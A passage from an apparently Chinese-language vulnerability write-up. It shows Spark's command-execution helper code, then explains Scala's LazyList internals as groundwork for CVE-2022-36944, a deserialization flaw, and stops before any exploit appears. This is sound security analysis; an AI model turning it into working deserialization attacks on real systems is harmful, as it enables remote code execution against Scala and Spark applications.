</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 等待命令执行完毕
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">val</span> exitCode <span style="color:#66d9ef">=</span> process<span style="color:#f92672">.</span>waitFor<span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>    stdoutThread<span style="color:#f92672">.</span>join<span style="color:#f92672">()</span>   <span style="color:#75715e">// Wait for it to finish reading output
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>exitCode <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>      logError<span style="color:#f92672">(</span><span style="color:#e6db74">s&#34;Process </span><span style="color:#e6db74">$command</span><span style="color:#e6db74"> exited with code </span><span style="color:#e6db74">$exitCode</span><span style="color:#e6db74">: </span><span style="color:#e6db74">$output</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">SparkException</span><span style="color:#f92672">(</span><span style="color:#e6db74">s&#34;Process </span><span style="color:#e6db74">$command</span><span style="color:#e6db74"> exited with code </span><span style="color:#e6db74">$exitCode</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>    output<span style="color:#f92672">.</span>toString
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
</span></span></code></pre></div><p><em>Utils#executeCommand</em></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> executeCommand<span style="color:#f92672">(</span>
</span></span><span style="display:flex;"><span>      command<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Seq</span><span style="color:#f92672">[</span><span style="color:#66d9ef">String</span><span style="color:#f92672">],</span>
</span></span><span style="display:flex;"><span>      workingDir<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">File</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">File</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;.&#34;</span><span style="color:#f92672">),</span>
</span></span><span style="display:flex;"><span>      extraEnvironment<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Map</span><span style="color:#f92672">[</span><span style="color:#66d9ef">String</span>, <span style="color:#66d9ef">String</span><span style="color:#f92672">]</span> <span style="color:#66d9ef">=</span> <span style="color:#a6e22e">Map</span><span style="color:#f92672">.</span>empty<span style="color:#f92672">,</span>
</span></span><span style="display:flex;"><span>      redirectStderr<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Boolean</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span><span style="color:#f92672">)</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Process</span> <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 构建命令执行
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">val</span> builder <span style="color:#66d9ef">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ProcessBuilder</span><span style="color:#f92672">(</span>command<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">_</span><span style="color:#66d9ef">*</span><span style="color:#f92672">).</span>directory<span style="color:#f92672">(</span>workingDir<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">val</span> environment <span style="color:#66d9ef">=</span> builder<span style="color:#f92672">.</span>environment<span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> <span style="color:#f92672">((</span>key<span style="color:#f92672">,</span> value<span style="color:#f92672">)</span> <span style="color:#66d9ef">&lt;-</span> extraEnvironment<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>      environment<span style="color:#f92672">.</span>put<span style="color:#f92672">(</span>key<span style="color:#f92672">,</span> value<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 执行命令
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">val</span> process <span style="color:#66d9ef">=</span> builder<span style="color:#f92672">.</span>start<span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>redirectStderr<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">val</span> threadName <span style="color:#66d9ef">=</span> <span style="color:#e6db74">&#34;redirect stderr for command &#34;</span> <span style="color:#f92672">+</span> command<span style="color:#f92672">(</span><span style="color:#ae81ff">0</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">def</span> log<span style="color:#f92672">(</span>s<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">String</span><span style="color:#f92672">)</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Unit</span> <span style="color:#f92672">=</span> logInfo<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>      processStreamByLine<span style="color:#f92672">(</span>threadName<span style="color:#f92672">,</span> process<span style="color:#f92672">.</span>getErrorStream<span style="color:#f92672">,</span> log<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>    process
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
</span></span></code></pre></div><h3 id="32-lazylist反序列化漏洞cve-2022-36944">3.2 LazyList反序列化漏洞（CVE-2022-36944）<a hidden class="anchor" aria-hidden="true" href="#32-lazylist反序列化漏洞cve-2022-36944">#</a></h3>
<h4 id="321-lazylist存储与求值原理">3.2.1 LazyList存储与求值原理<a hidden class="anchor" aria-hidden="true" href="#321-lazylist存储与求值原理">#</a></h4>
<p><code>Scala</code> 的 <code>LazyList</code> 是一种惰性求值的集合类型，它可以在需要时才计算元素值，而不是像 <code>List</code> 一样在创建时就一次性计算所有元素。<code>LazyList</code> 可以处理无限序列和非常大的数据集，而不会导致内存溢出或性能问题。以下代码展示了如何使用<code>LazyList</code>进行有限数据存储以及计算。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span><span style="color:#66d9ef">package</span> org.example
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">object</span> <span style="color:#a6e22e">LazyListTest</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">def</span> main<span style="color:#f92672">(</span>args<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Array</span><span style="color:#f92672">[</span><span style="color:#66d9ef">String</span><span style="color:#f92672">])</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Unit</span> <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">val</span> ll<span style="color:#66d9ef">:</span><span style="color:#66d9ef">LazyList</span><span style="color:#f92672">[</span><span style="color:#66d9ef">Int</span><span style="color:#f92672">]</span> <span style="color:#66d9ef">=</span>  <span style="color:#a6e22e">LazyList</span><span style="color:#f92672">(</span><span style="color:#ae81ff">1</span><span style="color:#f92672">,</span><span style="color:#ae81ff">2</span><span style="color:#f92672">,</span><span style="color:#ae81ff">3</span><span style="color:#f92672">,</span><span style="color:#ae81ff">4</span><span style="color:#f92672">,</span><span style="color:#ae81ff">5</span><span style="color:#f92672">,</span><span style="color:#ae81ff">6</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    ll<span style="color:#f92672">.</span>map<span style="color:#f92672">(</span><span style="color:#66d9ef">_</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">).</span>take<span style="color:#f92672">(</span><span style="color:#ae81ff">2</span><span style="color:#f92672">).</span>foreach<span style="color:#f92672">(</span>println<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><p>上面代码首先创建<code>LazyList</code>对象，然后将每个元素都乘以<code>2</code>，然后取出前两个元素输出到标准输出设备中。<code>LazyList</code>除了可以处理有限数据外，还可以处理无限数据，下面的代码创建了一个从<code>1</code>开始步长为<code>2</code>的<code>LazyList</code>对象。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span><span style="color:#66d9ef">package</span> org.example
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">object</span> <span style="color:#a6e22e">LazyListTest</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">def</span> main<span style="color:#f92672">(</span>args<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Array</span><span style="color:#f92672">[</span><span style="color:#66d9ef">String</span><span style="color:#f92672">])</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Unit</span> <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">val</span> ll<span style="color:#66d9ef">:</span><span style="color:#66d9ef">LazyList</span><span style="color:#f92672">[</span><span style="color:#66d9ef">Int</span><span style="color:#f92672">]</span> <span style="color:#66d9ef">=</span>  <span style="color:#a6e22e">LazyList</span><span style="color:#f92672">.</span>from<span style="color:#f92672">(</span><span style="color:#ae81ff">1</span><span style="color:#f92672">,</span><span style="color:#ae81ff">2</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    ll<span style="color:#f92672">.</span>map<span style="color:#f92672">(</span><span style="color:#66d9ef">_</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">).</span>take<span style="color:#f92672">(</span><span style="color:#ae81ff">10</span><span style="color:#f92672">).</span>foreach<span style="color:#f92672">(</span>println<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><p>执行结果如下：</p>
<p><img loading="lazy" src="attachments/5c069ba5-4b2a-430d-925e-e89f6a3433cd.png" alt=""  />
</p>
<p>那么<code>LazyList</code>是如何实现无限数据的存储的呢？我们将从<code>form</code>方法开始进行解释</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> from<span style="color:#f92672">(</span>start<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Int</span><span style="color:#f92672">,</span> step<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Int</span><span style="color:#f92672">)</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">LazyList</span><span style="color:#f92672">[</span><span style="color:#66d9ef">Int</span><span style="color:#f92672">]</span> <span style="color:#66d9ef">=</span>
</span></span><span style="display:flex;"><span>   newLL<span style="color:#f92672">(</span>sCons<span style="color:#f92672">(</span>start<span style="color:#f92672">,</span> from<span style="color:#f92672">(</span>start <span style="color:#f92672">+</span> step<span style="color:#f92672">,</span> step<span style="color:#f92672">)))</span>
</span></span></code></pre></div><p>上面代码中，<code>start</code>参数为起始值，<code>step</code>为步长。方法体中首先调用了<code>sCons</code>方法，再将其调用结果传入到<code>newLL</code>方法中。<code>sCons</code>的第二个参数递归地调用了<code>from</code>方法，且将<code>from</code>的第一个参数设置为前一次计算的<code>start</code>的值<code>+</code>步长。<code>sCons</code>方法创建了一个<code>Cons</code>对象，其主构造方法第一个参数称为<code>head</code>，表示序列的第一个值，第二个参数称为<code>tail</code>，表示剩余值的计算方法，即LazyList存储地不是所有的序列值，而是存储着序列的计算方法。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span><span style="color:#75715e">// Cons是State的子类
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">@inline</span> <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">def</span> sCons<span style="color:#f92672">[</span><span style="color:#66d9ef">A</span><span style="color:#f92672">](</span>hd<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">A</span><span style="color:#f92672">,</span> tl<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">LazyList</span><span style="color:#f92672">[</span><span style="color:#66d9ef">A</span><span style="color:#f92672">])</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">State</span><span style="color:#f92672">[</span><span style="color:#66d9ef">A</span><span style="color:#f92672">]</span> <span style="color:#66d9ef">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">State</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Cons</span><span style="color:#f92672">[</span><span style="color:#66d9ef">A</span><span style="color:#f92672">](</span>hd<span style="color:#f92672">,</span> tl<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>而在<code>newLL</code>方法中则创建了<code>LazyList</code>对象，<code>LazyList</code>的构造方法接受的是一个无参匿名函数</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span><span style="color:#a6e22e">@inline</span> <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">def</span> newLL<span style="color:#f92672">[</span><span style="color:#66d9ef">A</span><span style="color:#f92672">](</span>state<span style="color:#66d9ef">:</span> <span style="color:#f92672">=&gt;</span> <span style="color:#a6e22e">State</span><span style="color:#f92672">[</span><span style="color:#66d9ef">A</span><span style="color:#f92672">])</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">LazyList</span><span style="color:#f92672">[</span><span style="color:#66d9ef">A</span><span style="color:#f92672">]</span> <span style="color:#66d9ef">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">LazyList</span><span style="color:#f92672">[</span><span style="color:#66d9ef">A</span><span style="color:#f92672">](()</span> <span style="color:#66d9ef">=&gt;</span> state<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>上文解释了LazyList对象是如何构建的，以及其存储无限值的方法，下面看看LazyList是如何求值的。</p>
<p>对<code>LazyList</code>取值可通过<code>foreach</code>进行，该函数接受一个单参数匿名函数用以对遍历的结果进行处理，如<code>println</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span>  <span style="color:#a6e22e">@tailrec</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">override</span> <span style="color:#66d9ef">def</span> foreach<span style="color:#f92672">[</span><span style="color:#66d9ef">U</span><span style="color:#f92672">](</span>f<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">A</span> <span style="color:#f92672">=&gt;</span> U<span style="color:#f92672">)</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Unit</span> <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>   <span style="color:#75715e">// isEmpty是一个方法，scala中方法无参数可以省略()
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(!</span>isEmpty<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// head也是一个方法
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      f<span style="color:#f92672">(</span>head<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>      tail<span style="color:#f92672">.</span>foreach<span style="color:#f92672">(</span>f<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
</span></span></code></pre></div><p>在<code>foreach</code>中，首先调用<code>isEmpty</code>方法判断当前<code>LazyList</code>对象是否为空，若为空则直接结束，若不为空则计算第一个值<code>head</code>并进行输出，然后对剩余的值<code>tail</code>递归调用<code>foreach</code>方法继续处理，从而实现了无限取值。<code>isEmpty</code>方法通过比较当前<code>state</code>是否为 <code>State.Empty</code>来判断<code>LazyList</code>对象是否为空。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span><span style="color:#66d9ef">override</span> <span style="color:#66d9ef">def</span> isEmpty<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Boolean</span> <span style="color:#f92672">=</span> state eq <span style="color:#a6e22e">State</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Empty</span>
</span></span></code></pre></div><p>​state变量在LazyList初始化时被创建且其被关键字lazy修饰，lazy关键字赋予了其延迟加载的特性，是实现无限数量序列存储的关键环节。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span><span style="color:#a6e22e">@SerialVersionUID</span><span style="color:#f92672">(</span><span style="color:#ae81ff">3L</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">final</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">LazyList</span><span style="color:#f92672">[</span><span style="color:#66d9ef">+A</span><span style="color:#f92672">]</span> <span style="color:#a6e22e">private</span><span style="color:#f92672">(</span><span style="color:#66d9ef">private</span><span style="color:#f92672">[</span><span style="color:#66d9ef">this</span><span style="color:#f92672">]</span> <span style="color:#66d9ef">var</span> lazyState<span style="color:#66d9ef">:</span> <span style="color:#f92672">()</span> <span style="color:#f92672">=&gt;</span> <span style="color:#a6e22e">LazyList</span><span style="color:#f92672">.</span><span style="color:#a6e22e">State</span><span style="color:#f92672">[</span><span style="color:#66d9ef">A</span><span style="color:#f92672">])</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">AbstractSeq</span><span style="color:#f92672">[</span><span style="color:#66d9ef">A</span><span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> <span style="color:#a6e22e">LinearSeq</span><span style="color:#f92672">[</span><span style="color:#66d9ef">A</span><span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> <span style="color:#a6e22e">LinearSeqOps</span><span style="color:#f92672">[</span><span style="color:#66d9ef">A</span>, <span style="color:#66d9ef">LazyList</span>, <span style="color:#66d9ef">LazyList</span><span style="color:#f92672">[</span><span style="color:#66d9ef">A</span><span style="color:#f92672">]]</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> <span style="color:#a6e22e">IterableFactoryDefaults</span><span style="color:#f92672">[</span><span style="color:#66d9ef">A</span>, <span style="color:#66d9ef">LazyList</span><span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> <span style="color:#a6e22e">Serializable</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">import</span> LazyList._
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">@volatile</span> <span style="color:#66d9ef">private</span><span style="color:#f92672">[</span><span style="color:#66d9ef">this</span><span style="color:#f92672">]</span> <span style="color:#66d9ef">var</span> stateEvaluated<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Boolean</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">@inline</span> <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">def</span> stateDefined<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Boolean</span> <span style="color:#f92672">=</span> stateEvaluated
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">private</span><span style="color:#f92672">[</span><span style="color:#66d9ef">this</span><span style="color:#f92672">]</span> <span style="color:#66d9ef">var</span> midEvaluation <span style="color:#66d9ef">=</span> <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span>   <span style="color:#75715e">// lazy关键字修饰，懒加载，第一次被使用时才进行求值
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">lazy</span> <span style="color:#66d9ef">val</span> state<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">State</span><span style="color:#f92672">[</span><span style="color:#66d9ef">A</span><span style="color:#f92672">]</span> <span style="color:#66d9ef">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// if it&#39;s already mid-evaluation, we&#39;re stuck in an infinite
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// self-referential loop (also it&#39;s empty)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>midEvaluation<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">RuntimeException</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;self-referential LazyList or a derivation thereof has no more elements&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 中间求值标志
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    midEvaluation <span style="color:#66d9ef">=</span> <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">val</span> res <span style="color:#66d9ef">=</span> <span style="color:#66d9ef">try</span> lazyState<span style="color:#f92672">()</span> <span style="color:#66d9ef">finally</span> midEvaluation <span style="color:#66d9ef">=</span> <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// if we set it to `true` before evaluating, we may infinite loop
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// if something expects `state` to already be evaluated
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// 是否已经被求值
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    stateEvaluated <span style="color:#66d9ef">=</span> <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span>    lazyState <span style="color:#66d9ef">=</span> <span style="color:#66d9ef">null</span> <span style="color:#75715e">// allow GC
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    res
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span></code></pre></div><p>state变量的值来自于lazyState方法的计算结果，该方法通过lazyList主构造方法的第一个参数进行传递，前文创建LazyList调用newLL方法时传入的sCons方法返回对象即为lazyState()方法，即一个Cons（State的子类）对象，当该State对象不为空(Empty)时，便可一直取值。若要实现固定数量取值，可使用take方法。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span>ll<span style="color:#f92672">.</span>take<span style="color:#f92672">(</span><span style="color:#ae81ff">10</span><span style="color:#f92672">).</span>foreach<span style="color:#f92672">(</span>println<span style="color:#f92672">)</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span> <span style="color:#66d9ef">override</span> <span style="color:#66d9ef">def</span> take<span style="color:#f92672">(</span>n<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Int</span><span style="color:#f92672">)</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">LazyList</span><span style="color:#f92672">[</span><span style="color:#66d9ef">A</span><span style="color:#f92672">]</span> <span style="color:#66d9ef">=</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>knownIsEmpty<span style="color:#f92672">)</span> <span style="color:#a6e22e">LazyList</span><span style="color:#f92672">.</span>empty
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#f92672">(</span>takeImpl<span style="color:#f92672">(</span>n<span style="color:#f92672">)</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">@inline</span><span style="color:#f92672">)</span>
</span></span></code></pre></div><p>在<code>take</code>方法中首先调用<code>knownIsEmpty</code>方法判断当前<code>LazyList</code>是否为空，若为空则响应一个<code>Empty</code>对象，不为空则调用<code>takeImpl</code>方法。</p>
<p>在<code>takeImpl</code>方法中，首先判断<code>n</code>的大小，如果小于<code>0</code>则响应一个<code>Empty</code>对象，该条件是<code>takeImpl</code>递归的基例。如果不为<code>0</code>则继续尝试调用<code>isEmpty</code>方法判断根<code>LazyList</code>对象是否被取空，若被取空则响应一个<code>Empty</code>对象并结束递归，若未被取空则创建一个<code>sCons</code>对象，该对象的第二个参数递归调用<code>takeImpl</code>方法，其参数值随着递归深度增加逐步减<code>1</code>直到最终为<code>0</code>时响应一个<code>Empty</code>对象，此时在调用<code>foreach</code>方法进行值输出时进行<code>isEmpty</code>判断将会返回<code>true</code>，从而实现了固定数量取值。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span>  <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">def</span> takeImpl<span style="color:#f92672">(</span>n<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Int</span><span style="color:#f92672">)</span><span style="color:#66d9ef">:</span> <span style="color:#66d9ef">LazyList</span><span style="color:#f92672">[</span><span style="color:#66d9ef">A</span><span style="color:#f92672">]</span> <span style="color:#66d9ef">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>n <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">)</span> <span style="color:#a6e22e">LazyList</span><span style="color:#f92672">.</span>empty
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> newLL <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>isEmpty<span style="color:#f92672">)</span> <span style="color:#a6e22e">State</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Empty</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span> sCons<span style="color:#f92672">(</span>head<span style="color:#f92672">,</span> tail<span style="color:#f92672">.</span>takeImpl<span style="color:#f92672">(</span>n <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">))</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
</span></span></code></pre></div><p>在<code>take</code>方法中<code>knownIsEmpty</code>会首先判断当前<code>stateEvaluated</code>（表示是否已经取过值，若没有取过值则该变量为false）是否为<code>true</code>，若该值为<code>false</code>则表示还没有开始取值，可以放心得继续取值，若该值为<code>true</code>，则还需判断<code>tail</code>是否为<code>Empty</code>，即值是否已经被取空了。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-scala" data-lang="scala"><span style="display:flex;"><span><span style="color:#a6e22e">@inline</span> <span style="color:#66d9ef">private</span><span style="color:#f92672">[</span><span style="color:#66d9ef">this</span><span style="color:#f92672">]</span> <span style="color:#66d9ef">def</span> knownIsEmpty<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">Boolean</span> <span style="color:#f92672">=</span> stateEvaluated <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">(</span>isEmpty<span style="color:#66d9ef">:</span> <span style="color:#66d9ef">@inline</span><span style="color:#f92672">)</span>
</span></span></code></pre></div><h4 id="322-lazylist序列化与反序列化">3.2.2 LazyList序列化与反序列化<a hidden class="anchor" aria-hidden="true" href="#322-lazylist序列化与反序列化">#</a></h4>
<p><code>LazyList</code>并没有实现<code>readObject/writeObject/readExternalObject/writeExternalObject</code>方法，却实现了<code>writeReplace</code>方法，该方法在序列化对象时将替换正在被序列化的<code>LazyList</code>对象，反序列化时若替换的对象中存在<code>readResolve</code>方法将使用该方法还原<code>LazyList</code>对象</p>
<p><code>LazyList</code>的<code>writeReplace</code>方法如下：</p>
